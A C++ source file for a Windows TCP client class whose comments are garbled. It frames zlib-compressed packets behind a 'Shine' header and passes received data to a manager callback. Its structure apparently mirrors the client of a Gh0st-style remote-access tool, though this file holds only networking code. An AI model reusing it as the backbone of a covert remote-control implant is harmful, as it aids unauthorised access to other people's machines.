#include "StdAfx.h"
#include "ClientSocket.h"
#include "Common.h"
#include "zlib.h"
#include <iostream>
using namespace std;






CClientSocket::CClientSocket()
{
	//��ʼ���׽��ֿ�
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);                      
	m_hEvent = CreateEvent(NULL, true, false, NULL);   
	m_bIsRunning    = false;
	m_hWorkerThread = NULL;
	m_Socket = INVALID_SOCKET;
	BYTE bPacketFlag[] = {'S', 'h', 'i', 'n', 'e'};                //���ݰ���ͷ
	memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));
}


CClientSocket::~CClientSocket()
{
	m_bIsRunning = false;
	WaitForSingleObject(m_hWorkerThread, INFINITE);   //�ȴ������߳��˳�
	
	if (m_Socket != INVALID_SOCKET)
	{
		Disconnect();                                 //�Ͽ����Ӻ���
	}
	
	CloseHandle(m_hWorkerThread);                     //�ر��߳��¼����
	CloseHandle(m_hEvent);                     
	WSACleanup();
}




void CClientSocket::Disconnect()
{
    LINGER lingerStruct;
    lingerStruct.l_onoff = 1;
    lingerStruct.l_linger = 0;
    setsockopt(m_Socket, SOL_SOCKET, SO_LINGER, 
		(char *)&lingerStruct, sizeof(lingerStruct) );
	
	CancelIo((HANDLE)m_Socket);
	InterlockedExchange((LPLONG)&m_bIsRunning, false);     //֪ͨ�����߳��˳����ź�
	closesocket(m_Socket);
	
	SetEvent(m_hEvent);	  


	cout<<"ShutDown"<<endl;
	
	m_Socket = INVALID_SOCKET;
}




//---�����ض˷�������
bool CClientSocket::Connect(LPCTSTR lpszHost, UINT nPort)
{
	//һ��Ҫ���һ�£���Ȼsocket��ľ�ϵͳ��Դ
	Disconnect();
	// �����¼�����
	ResetEvent(m_hEvent);
	m_bIsRunning = false;
	
	//�������ӵ��׽���
	m_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
	
	if (m_Socket == SOCKET_ERROR)   
	{ 
		return false;   
	}
	
	hostent* pHostent = NULL;

	pHostent = gethostbyname(lpszHost);
	
	if (pHostent == NULL)
	{
		return false;
	}
	
	//����sockaddr_in�ṹ Ҳ�������ض˵Ľṹ
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family	= AF_INET;
	ClientAddr.sin_port	= htons(nPort);	
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);
	
	if (connect(m_Socket, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR) 
	{
		return false;
	}

	// ���ñ�����ƣ��Լ�������ʵ��
	
	const char chOpt = 1; // True
	// Set KeepAlive �����������, ��ֹ����˲���������
	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&chOpt, sizeof(chOpt)) == 0)
	{
		// ���ó�ʱ��ϸ��Ϣ
		tcp_keepalive	klive;
		klive.onoff = 1; // ���ñ���
		klive.keepalivetime = 1000 * 60 * 3; // 3���ӳ�ʱ Keep Alive
		klive.keepaliveinterval = 1000 * 5;  // ���Լ��Ϊ5�� Resend if No-Reply
		WSAIoctl
			(
			m_Socket, 
			SIO_KEEPALIVE_VALS,
			&klive,
			sizeof(tcp_keepalive),
			NULL,
			0,
			(unsigned long *)&chOpt,
			0,
			NULL
			);
	}
	
	m_bIsRunning = true;
	//���ӳɹ������������߳�  ת��WorkThread
	m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, 
		(LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL, true);
	
	return true;
}




DWORD WINAPI CClientSocket::WorkThread(LPVOID lparam)   
{
	CClientSocket *pThis = (CClientSocket *)lparam;
	char	buff[MAX_RECV_BUFFER];

	fd_set fdSocket;
	
	FD_ZERO(&fdSocket);
	
	FD_SET(pThis->m_Socket, &fdSocket);
	
	while (pThis->IsRunning())                //������ض� û���˳�����һֱ�������ѭ����
	{
		fd_set fdRead = fdSocket;
		int nRet = select(NULL, &fdRead, NULL, NULL, NULL);   //�����ж��Ƿ�Ͽ�����
		if (nRet == SOCKET_ERROR)      
		{
			pThis->Disconnect();
			break;
		}
		if (nRet > 0)
		{
			memset(buff, 0, sizeof(buff));
			int nSize = recv(pThis->m_Socket, buff, sizeof(buff), 0);     //�������ض˷���������
			if (nSize <= 0)
			{
				pThis->Disconnect();//���մ�����
				break;
			}
			if (nSize > 0) 
			{
				pThis->OnRead((LPBYTE)buff, nSize);   //��ȷ���վ͵��� OnRead���� ת��OnRead
			}
		}
	}
	
	return -1;
}


//��������
void CClientSocket::OnRead( LPBYTE lpBuffer, DWORD dwIoSize)
{
	try
	{
		if (dwIoSize == 0)
		{
			Disconnect();       //������
			return;
		}

		//shine

		//���ݰ����� Ҫ�����·���
		if (dwIoSize == FLAG_SIZE && memcmp(lpBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
		{
			// ���·���	
			Send(m_ResendWriteBuffer.GetBuffer(), m_ResendWriteBuffer.GetBufferLen());
			return;
		}
	

		//���½ӵ����ݽ��н�ѹ��
		m_CompressionBuffer.Write(lpBuffer, dwIoSize);
		
		
	
		//��������Ƿ��������ͷ��С ��������ǾͲ�����ȷ������
		while (m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
		{
			BYTE bPacketFlag[FLAG_SIZE];
			CopyMemory(bPacketFlag, m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));
			//�ж�����ͷ
			if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)
			{
				throw "Bad Buffer";
			}
			
			int nSize = 0;
			CopyMemory(&nSize, m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(int));
			
			//--- ���ݵĴ�С��ȷ�ж�
			if (nSize && (m_CompressionBuffer.GetBufferLen()) >= nSize)
			{
				int nUnCompressLength = 0;
				//�õ�������������

				m_CompressionBuffer.Read((PBYTE) bPacketFlag, sizeof(bPacketFlag));
				m_CompressionBuffer.Read((PBYTE) &nSize, sizeof(int));
				m_CompressionBuffer.Read((PBYTE) &nUnCompressLength, sizeof(int));
			
				int	nCompressLength = nSize - HDR_SIZE;
				PBYTE pData = new BYTE[nCompressLength];
				PBYTE pDeCompressionData = new BYTE[nUnCompressLength];
				
				if (pData == NULL || pDeCompressionData == NULL)
					throw "bad Allocate";
				
				m_CompressionBuffer.Read(pData, nCompressLength);
				
				unsigned long	destLen = nUnCompressLength;
				int	nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);
		

				if (nRet == Z_OK)//�����ѹ�ɹ�
				{
					m_DeCompressionBuffer.ClearBuffer();
					m_DeCompressionBuffer.Write(pDeCompressionData, destLen);
	
					//��ѹ�õ����ݺͳ��ȴ��ݸ�����Manager���д��� ע�����������˶�̬
					//����m_pManager�е����಻һ����ɵ��õ�OnReceive������һ��
					m_pManager->OnReceive(m_DeCompressionBuffer.GetBuffer(0), 
						m_DeCompressionBuffer.GetBufferLen());
				}
				else
					throw "Bad Buffer";
				
				delete [] pData;
				delete [] pDeCompressionData;
			}
			else
				break;
		}
	}catch(...)
	{
		m_CompressionBuffer.ClearBuffer();
		Send(NULL, 0);
	}
	
}



//��������
int CClientSocket::Send( LPBYTE lpData, UINT nSize)   //10
{
	
	m_WriteBuffer.ClearBuffer();
	
	if (nSize > 0)
	{
		//����1.001�������Ҳ��������ѹ����ռ�õ��ڴ�ռ��ԭ��һ�� +12 ��ֹ���������

		//ѹ������
		unsigned long	destLen = (double)nSize * 1.001  + 12;  //10 6
		LPBYTE			pDest = new BYTE[destLen];              //new   22  vir
		
		if (pDest == NULL)
		{
			return 0;
		}
		
		int	nRet = compress(pDest, &destLen, lpData, nSize);   //ѹ������
		
		if (nRet != Z_OK)
		{
			delete [] pDest;
			return -1;
		}
		



		//�������ݰ� 35
         
	    //S h i n e 000X 000A HelloWorld
		//////////////////////////////////////////////////////////////////////////
		LONG nBufLen = destLen + HDR_SIZE;    //�����������ݰ�����ͷ��
	
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag)); 
		//���ݰ��ı�־Shine 5���ֽ�
		
	
		
		m_WriteBuffer.Write((PBYTE)&nBufLen, sizeof(nBufLen));    
		//�������ݰ��Ĵ�С  4���ֽ�
	
		
		m_WriteBuffer.Write((PBYTE) &nSize, sizeof(nSize));         
		//���ݰ�ԭʼ(ѹ��ǰ)�Ĵ�С 4���ֽ�

		m_WriteBuffer.Write(pDest, destLen);                        
		
		//ѹ���������
		delete [] pDest;
		
	
		//����ԭʼ����û�б�ѹ��  Hello   Send  -->   10 
		LPBYTE lpResendWriteBuffer = new BYTE[nSize];
		CopyMemory(lpResendWriteBuffer, lpData, nSize);
		m_ResendWriteBuffer.ClearBuffer();  //1024
		m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// ���ݷ��͵�����
		if (lpResendWriteBuffer)
			delete [] lpResendWriteBuffer;
	}
	else // Ҫ���ط�, ֻ����FLAG
	{
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// ���ݷ��͵�����	
	}
	
	// �ֿ鷢��  //Base 1025
	return SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), 
		MAX_SEND_BUFFER);
}


                                 //Base         1025       2049  1024  1024  1
int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)
{
	int			nRet = 0;
	const char	*pbuf = (char *)lpData;
	int			size = 0;
	int			nSend = 0;
	int			nSendRetry = 15;
	// ���η���
	for (size = nSize; size >= nSplitSize; size -= nSplitSize)
	{
		for (int i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, pbuf, nSplitSize, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;
		
		nSend += nRet;   //1024
		pbuf += nSplitSize;
		Sleep(10); //�����������ƶ����ݻ���
	}
	// �������Ĳ���
	if (size > 0)
	{
		for (int i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, (char *)pbuf, size, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;
		nSend += nRet;
	}
	if (nSend == nSize)
	{
		return nSend;
	}
	else
	{
		return SOCKET_ERROR;
	}
}




bool CClientSocket::IsRunning()
{
	return m_bIsRunning;
}


void CClientSocket::setManagerCallBack(CManager *pManager)   //Kernel 
{
	m_pManager = pManager;           //m_pManager����ָ��
}



void CClientSocket::RunEventLoop()
{
	WaitForSingleObject(m_hEvent, INFINITE);
}
